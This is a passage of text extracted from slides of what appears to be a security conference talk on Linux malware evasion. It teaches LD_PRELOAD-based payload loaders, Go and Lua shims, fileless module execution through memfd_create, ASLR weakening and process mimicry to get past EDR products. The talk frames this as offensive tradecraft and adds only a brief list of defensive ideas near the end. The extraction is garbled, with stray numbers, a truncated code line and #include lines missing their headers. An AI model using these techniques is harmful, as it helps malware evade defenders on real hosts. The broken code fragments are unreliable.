 34,3
$ mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls; 
LD_PRELOAD=payload.so
/lib64/ld-linux-x86-64.so.2 /bin/busybox
run-parts /tmp/shadowrun/
 2,331,33311
echo | LD_PRELOAD=payload.so
/lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls
 ,3,3.2  ,23.2
$ LD_PRELOAD=payload.so
/lib64/ld-linux-x86-64.so.2
vi -ensX $(/bin/busybox mktemp)
-c ':1,$d' -c ':silent !/bin/ls'
-c ':wq'
Utilization: Out of the Box Decoys (Cont.)
Second Order Evasion Capabilities
Interface with a higher level code for greater evasion.
Rapid prototyping and development of modular malware.
• speed of development
• better upgrades
• memory safety 
ü Offense to retool quickly on the target box. 
ü "evade into reflection”. 
Faced with dynamic code EDRs get lost in reflection tracing a call chain to a verified IoC.
ü Extend malware into preloading code from dynamic languages with decent FFI
0x6A: Hiding Behind Reflective Mirrors
package main
import "C"
import (
"fmt"
)
var count int
//export Entry
func Entry(msg string) int {
fmt.Println(msg)
return count
}
func main() { // don’t care, or wild goose chase }
go build -o shim.so -buildmode=c-shared shim.go
DFIR: Reverse 2059 functions as a starting point ... 
0x6B: Escape to Dynamic Code: Interpreters
#include 
#include 
#include 
int main(int argc, char** argv)
{
lua_State *L;
L = luaL_newstate();
luaL_openlibs(L); 
/* Load the Lua script */
if (luaL_loadfile(L, argv[1]))
/* Run Lua script */
lua_pcall(L, 0, 0, 0)
lua_close(L); 
}
$LD_LIBRARY_PATH=. 
LD_PRELOAD=./liblua.so
./invoke_lua hello.lua
Main() is nothing more than a preloaded 
constructor at this point
• EDRs lose trail if you 
escape out to scripting 
• start  loading other libraries at runtime. 
Pro-tip: Use it as another abstraction layer, 
e.g. socket out or pipe  to another process 
hosting additional payloads
Summary: Ain’t No Primitive Primitives.
Stage II: Weaponizing and Operationalizing Payloads
ü Uber preloaders
ü Inline Parameterized Command Evasion.
ü Memory-resident Malware Modules.
ü Modular Malware Payload Warehouses
ü Remote module loads
ü Utilizable loaders
Uber preloaders
__attribute__((constructor)) static void
_mctor(int argc, char **argv, char** envp)
{
// Save pointers to argv/argc/envp
largv=argv;
largc=argc;
lenvp=envp;
lenvp_start=envp;  /* code here */
}
•
..
•
 .
.
$LD_PRELOAD=./lib/libctx.so.1 /bin/ls 
Uber Preloaders
$
LD_BG="false" LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so” LD_MODULE_ARGS="hello"
\
LD_PRELOAD=./lib/libctx.so.1 /bin/ls
Uber Preloaders
// resolve Entry symbol
int (*entry)(char *) = dlsym(handle, "Entry");
//pass arguments along if any
if ( (modload_args_t = (char*) getenv("LD_MODULE_ARGS")) != NULL ){
modload_args = strdup(modload_args_t);
modload_args_len = strlen(modload_args);
}
Chains may  still
• dlopen() a module or use weak references
• Adhere to API contracts
• Implement Process mimicry and decoys
• Switch on IPC communication and data signaling
• Clean out artifacts (a la rootkit)
// Call FFI  stack
Memory-resident malware modules
One small problem: those modules are files. 
• On disk. 
• Scannable and inspectable by EDRs. 
• And admins.
Sometimes it’s OK (EDR identity crisis). We still want flexibility.
The way to fix that is to 
load modules in memory. OS is happy
execute them from memory. OS is not happy. Let’s make it happy.
Memory-resident malware modules
Several ways to operate files in shared memory in Linux:
• tmpfs filesystem (via /dev/shm), if mounted; have to be root to mount 
others. 
• POSIX shared memory, memory mmap()'d files. 
o Some, you cannot obtain execution of code from.
o Others, do not provide you fully memory based abstraction, leaving a file 
path visible for inspection.
Kernel 3.17 Linux gained a system call memfd_create(2) (sys_356/319)
Memory-resident malware modules
shm_fd = memfd_create(s, MFD_ALLOW_SEALING);    
if (shm_fd  /dev/null
l-wx------ 1 root root 64 Feb 17 18:08 1 -> /dev/null
lrwx------ 1 root root 64 Feb 17 18:08 2 -> /dev/null
lrwx------ 1 root root 64 Feb 17 18:08 3 -> '/memfd:fa37Jn 
(deleted)'
lrwx------ 1 root root 64 Feb 17 18:08 5 -> 'socket:[3479923]'
56880 18:26:52.395703 memfd_create("R6YP4OOR", MFD_CLOEXEC) = 3 
56884 18:26:52.586221 readlink("/proc/self/exe", "/memfd:R6YP4OOR (deleted)", 4096) = 25 
56886 18:26:52.632680 memfd_create("fa37Jn", MFD_CLOEXEC) = 4
Strace sees:
File Descriptors of the preload cradle
PyPreload: Cradle +  (Decoy / Mimicry) + Memory + ZAF
(,)(2- ),
ZAF + Dynamic FileLess Loader Operational Summary
2
1
4
3
1. ASLR at-start weakening
•
Weaken targets via predictable memory addresses
•
Load to static address or an artificial code cave. 
Linux execution domains 
ADDR_NO_RANDOMIZE (since Linux 2.6.12)
Parent -> set personality -> Fork() -> UNRANDOMIZED process
2. Cross Memory Attach 
•
Artificial Code Caves
•
IPC evasion (User to User  space vs. User to Kernel to User space)
process_vm_readv(), process_vm_writev()
Additional Tips and Research Roadmap
Additional Tips and Research Roadmap
Additional Tips and Research Roadmap
Offensive Summary
ü Preloading is a viable path to evasion via system executables.
ü Bring clean cradles to build on, or use executables on the target as decoys.
ü Use assembled attack. Split/Scatter/Assemble techniques vs. EDRs.
ü Out-of-process payload delivery is sometimes what you need. 
“Preloader-as-a-Service” over memory is possible.
ü C FFI is the common denominator for interop on  Linux, and can be used 
for evasion. 
ü Don’t kill a fly with a sword (even though you know you want to). 
But do turn chopsticks into swords when needed. 
ü Protect your payloads and payload delivery mechanisms.
Code: https://github.com/dsnezhkov/zombieant
What can the Defense do?
• Start implementing Linux capabilities.
• Define clearly what EDRs will and can do for you.
• Use provided ideas for manual threat hunting. 
• Optics into /proc.  
• Optics into dynamic loading, memfd().
• Optics into IPC
• Optics into process library load
• Start thinking more about proactive contextual supervision. 
EOF
SYN & ACK?
Thank you!
!
!
!
!
Useful Links (Thanks!)
https://x-c3ll.github.io/posts/fileless-memfd_create/
https://0x00sec.org/t/super-stealthy-droppers/3715
https://github.com/lattera/glibc/blob/master/csu/gmon-start.c
https://github.com/dvarrazzo/py-setproctitle/tree/master/src
https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/
https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1